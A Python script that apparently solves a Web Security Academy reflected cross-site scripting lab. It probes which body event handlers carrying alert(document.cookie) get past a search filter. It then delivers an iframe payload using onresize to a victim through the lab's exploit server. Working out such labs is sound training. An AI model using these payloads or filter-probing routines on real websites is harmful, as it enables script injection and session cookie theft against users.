import requests
from bs4 import BeautifulSoup

site = 'acff1fee1e902176c0430692003f00b5.web-security-academy.net'
s = requests.Session()


def storeAttackInExploitServer():
    site_url = f'https://{site}/'
    resp = s.get(site_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')
    search_term = '''<body onresize=alert(document.cookie)></body>'''
    exploit_html = f'''<iframe src="https://{site}/?search={search_term}" onload=this.style.width='100px'></iframe>'''
    form_data = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': exploit_html,
        'formAction': 'DELIVER_TO_VICTIM'
    }
    # 'formAction': 'STORE' <-- Use this just to store in exploit server instead of deliver attack
    return s.post(exploit_url, data=form_data)


def findSupportedAttributes():
    attributes = ['onload', 'onunload', 'onerror', 'onmessage', 'onpagehide', 'onpageshow', 'onresize', 'onstorage']
    for attribute in attributes:
        search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
        search_url = f'https://{site}/?search={search_term}'
        resp = s.get(search_url)
        if resp.status_code == 200:
            print(f'Success: {search_term} gives code {resp.status_code}')
        else:
            print(f'Error: {search_term} gives response: {resp.text}')


if __name__ == '__main__':
    odin_id = 'bradlet2'
    # search_term = f'''<body>{odin_id}</body>'''
    # search_url = f'https://{site}/?search={search_term}'

    # findSupportedAttributes()
    resp = storeAttackInExploitServer()
    print(resp.status_code)
    print(resp.text)

